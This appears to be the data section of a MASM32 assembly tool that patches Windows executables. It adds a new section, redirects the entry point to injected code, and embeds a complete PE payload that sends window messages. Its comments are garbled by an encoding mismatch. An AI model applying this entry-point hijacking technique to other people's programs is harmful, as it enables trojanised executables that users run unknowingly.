.386
.model flat,stdcall
option casemap:none

include    windows.inc
include    user32.inc
include    kernel32.inc
include    gdi32.inc
include    comctl32.inc
include    comdlg32.inc
include    advapi32.inc
include    shell32.inc
include    masm32.inc
include    netapi32.inc
include    winmm.inc
include    ws2_32.inc
include    psapi.inc
include    mpr.inc        ;WNetCancelConnection2
include    iphlpapi.inc   ;SendARP
includelib comctl32.lib
includelib comdlg32.lib
includelib gdi32.lib
includelib user32.lib
includelib kernel32.lib
includelib advapi32.lib
includelib shell32.lib
includelib masm32.lib
includelib netapi32.lib
includelib winmm.lib
includelib ws2_32.lib
includelib psapi.lib
includelib mpr.lib
includelib iphlpapi.lib


ICO_MAIN equ 1000
DLG_MAIN equ 1000
IDC_INFO equ 1001
IDM_MAIN equ 2000
IDM_OPEN equ 2001
IDM_EXIT equ 2002
IDM_1    equ 4000
IDM_2    equ 4001
IDM_3    equ 4002
RESULT_MODULE   equ 5000
ID_TEXT1        equ 5001
ID_TEXT2        equ 5002
IDC_MODULETABLE equ 5003
IDC_OK          equ 5004
ID_STATIC       equ 5005
ID_STATIC1      equ 5006
IDC_BROWSE1     equ 5007
IDC_BROWSE2     equ 5008
IDC_ADD         equ   5010
IDC_DEL         equ   5011
ID_TEXT3        equ  5012
ID_TEXT4        equ 5013
ID_TEXT5        equ 5014
ID_STATIC2      equ 5015
ID_STATIC3      equ 5016
ID_STATIC4      equ 5017
ID_STATIC5      equ 5018


MESSAGE_EXE_SIZE    equ   0E800h   ;_Message.exeģ��ĳߴ�

.data
hInstance   dd ?
hRichEdit   dd ?
hWinMain    dd ?
hWinEdit    dd ?
dwCount     dd ?
dwNumber    dd ?
dwColorRed  dd ?
hText1      dd ?
hText2      dd ?
hFile       dd ?


lpMessageCodeStart    dd   1B5Fh       ;��Ϣ������������ʼ
lpMessageDataStart    dd   0ED6h     ;���ڱ���������ʼ

dwCodeCount           dd   ?

dwPatchCodeSize   dd  ?     ;���������С
dwNewFileSize     dd  ?     ;���ļ���С=Ŀ���ļ���С+���������С
dwNewPatchCodeSize  dd ?    ;�������밴8λ�����Ĵ�С
dwPatchCodeSegStart  dd ?   ;�����������ڽ����ļ��е���ʼ��ַ
dwSectionCount       dd ?   ;Ŀ���ļ��ڵĸ���
dwSections           dd ?   ;���нڱ��С
dwNewHeaders         dd ?   ;���ļ�ͷ�Ĵ�С
dwFileAlign          dd ?   ;�ļ���������
dwFirstSectionStart  dd ?   ;Ŀ���ļ���һ�ھ����ļ���ʼ��ƫ����
dwOff                dd ?   ;���ļ���ԭ��������Ĳ���
dwValidHeadSize      dd ?   ;Ŀ���ļ�PEͷ����Ч���ݳ���
dwHeaderSize         dd ?   ;�ļ�ͷ����
dwBlock1             dd ?   ;ԭPEͷ����Ч���ݳ���+�����������Ч���ݳ���
dwPE_SECTIONSize     dd ?   ;PEͷ+�ڱ��С
dwSectionsLeft       dd ?   ;Ŀ���ļ����н����ݵĴ�С
dwNewSectionSize     dd ?   ;�����ӽڶ����ĳߴ�
dwNewSectionOff      dd ?   ;�����ӽ����������ļ��е�ƫ��
dwDstSizeOfImage     dd ?   ;Ŀ���ļ��ڴ�ӳ��Ĵ�С
dwNewSizeOfImage     dd ?   ;�����ӵĽ����ڴ�ӳ���еĴ�С
dwNewFileAlignSize   dd ?   ;�ļ������Ĵ�С
dwSectionsAlignLeft  dd ?   ;Ŀ���ļ������ļ��ж����Ĵ�С
dwLastSectionAlignSize  dd ?   ;Ŀ���ļ����һ�ڶ��������մ�С����������
dwLastSectionStart      dd ?   ;Ŀ���ļ����һ�����ļ��е�ƫ��
dwSectionAlign          dd ?   ;�ڶ�������
dwVirtualAddress        dd ?   ;���һ�ڵ���ʼRVA
dwEIPOff                dd ?   ;��EIPָ��;�EIPָ��ľ���



dwDstEntryPoint      dd ?   ;�ɵ���ڵ�ַ
dwNewEntryPoint      dd ?   ;�µ���ڵ�ַ

lpPatchPE         dd  ?   ;���������PE��־���ļ��е�λ�ã���Ϊ��0��ʼ���������λ��Ҳ��DOSͷ�Ĵ�С
lpDstMemory       dd  ?   ;�ڴ��д�����ļ����ݵ���ʼ��ַ
lpOthers          dd  ?   ;�����������ļ��е���ʼλ��


hProcessModuleTable dd ?


szFileName           db MAX_PATH dup(?)
szFileNameOpen1      db MAX_PATH dup(0)
szFileNameOpen2      db MAX_PATH dup(0)
szDstFile            db 'c:\_Message.exe',0
szDstFile1           db 'c:\setup.exe',0


szResultColName1 db  '��Ϣ���',0
szResultColName2 db  '������ֵ(H)',0
szResultColName3 db  '������ʱ(ms)',0
szBuffer         db  512 dup(0),0
bufTemp1         db  200 dup(0),0
bufTemp2         db  200 dup(0),0
bufTemp3         db  200 dup(0),0
szBuffer12       db  500 dup(0),0
szCode1          db  0ffh,75h,0fch,0ffh,75h,0f8h,0ffh,93h,0,26h,40h,0
                 db  89h,45h,0ech
                 db  6Ah,00h,6ah
szCode1_msg      db  0dh          ;��Ϣ����
                 db  68h,0,1,0,0,0ffh,75h,0ech,0ffh,93h,4,26h,40h,0,68h
szCode1_delay    dd  000003e8h    ;�ӳ�
                 db  0ffh,93h,24h,26h,40h,0
szCode1Size      equ $-szCode1


szFilter1        db  'Excutable Files',0,'*.exe;*.com',0
                 db  0

szMessageFile            db 4Dh,5Ah,90h,00h,03h,00h,00h,00h,04h,00h,00h,00h,0FFh,0FFh,00h,00h
    db 0B8h,00h,00h,00h,00h,00h,00h,00h,40h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,0A8h,00h,00h,00h
    db 0Eh,1Fh,0BAh,0Eh,00h,0B4h,09h,0CDh,21h,0B8h,01h,4Ch,0CDh,21h,54h,68h
    db 69h,73h,20h,70h,72h,6Fh,67h,72h,61h,6Dh,20h,63h,61h,6Eh,6Eh,6Fh
    db 74h,20h,62h,65h,20h,72h,75h,6Eh,20h,69h,6Eh,20h,44h,4Fh,53h,20h
    db 6Dh,6Fh,64h,65h,2Eh,0Dh,0Dh,0Ah,24h,00h,00h,00h,00h,00h,00h,00h
    db 5Dh,17h,1Dh,0DBh,19h,76h,73h,88h,19h,76h,73h,88h,19h,76h,73h,88h
    db 0E5h,56h,61h,88h,18h,76h,73h,88h,52h,69h,63h,68h,19h,76h,73h,88h
    db 00h,00h,00h,00h,00h,00h,00h,00h,50h,45h,00h,00h,4Ch,01h,01h,00h
    db 0F3h,78h,38h,4Ch,00h,00h,00h,00h,00h,00h,00h,00h,0E0h,00h,0Fh,01h
    db 0Bh,01h,05h,0Ch,00h,0E6h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 47h,0F4h,00h,00h,00h,10h,00h,00h,00h,00h,01h,00h,00h,00h,40h,00h
    db 00h,10h,00h,00h,00h,02h,00h,00h,04h,00h,00h,00h,00h,00h,00h,00h
    db 04h,00h,00h,00h,00h,00h,00h,00h,00h,00h,01h,00h,00h,02h,00h,00h
    db 00h,00h,00h,00h,02h,00h,00h,00h,00h,00h,10h,00h,00h,10h,00h,00h
    db 00h,00h,10h,00h,00h,10h,00h,00h,00h,00h,00h,00h,10h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 2Eh,74h,65h,78h,74h,00h,00h,00h,5Eh,0E4h,00h,00h,00h,10h,00h,00h
    db 00h,0E6h,00h,00h,00h,02h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,20h,00h,00h,0E0h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 0E9h,42h,0E4h,00h,00h,47h,65h,74h,50h,72h,6Fh,63h,41h,64h,64h,72h
    db 65h,73h,73h,00h,4Ch,6Fh,61h,64h,4Ch,69h,62h,72h,61h,72h,79h,41h
    db 00h,57h,69h,6Eh,64h,6Fh,77h,46h,72h,6Fh,6Dh,50h,6Fh,69h,6Eh,74h
    db 00h,50h,6Fh,73h,74h,4Dh,65h,73h,73h,61h,67h,65h,41h,00h,53h,65h
    db 74h,41h,63h,74h,69h,76h,65h,57h,69h,6Eh,64h,6Fh,77h,00h,53h,65h
    db 74h,46h,6Fh,72h,65h,67h,72h,6Fh,75h,6Eh,64h,57h,69h,6Eh,64h,6Fh
    db 77h,00h,53h,65h,6Eh,64h,4Dh,65h,73h,73h,61h,67h,65h,41h,00h,47h
    db 65h,74h,53h,79h,73h,74h,65h,6Dh,4Dh,65h,74h,72h,69h,63h,73h,00h
    db 45h,6Eh,75h,6Dh,57h,69h,6Eh,64h,6Fh,77h,73h,00h,47h,65h,74h,43h
    db 6Ch,61h,73h,73h,4Eh,61h,6Dh,65h,41h,00h,75h,73h,65h,72h,33h,32h
    db 2Eh,64h,6Ch,6Ch,00h,00h,43h,72h,65h,61h,74h,65h,44h,69h,72h,65h
    db 63h,74h,6Fh,72h,79h,41h,00h,53h,6Ch,65h,65h,70h,00h,63h,3Ah,5Ch
    db 5Ch,42h,42h,42h,4Eh,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,0CCh,0CCh,0CCh,0CCh,0CCh,0CCh,0CCh,0CCh,0CCh,0CCh
    db 0CCh,0CCh,0CCh,0CCh,0CCh,0CCh,30h,31h,32h,33h,34h,35h,36h,37h,38h,39h
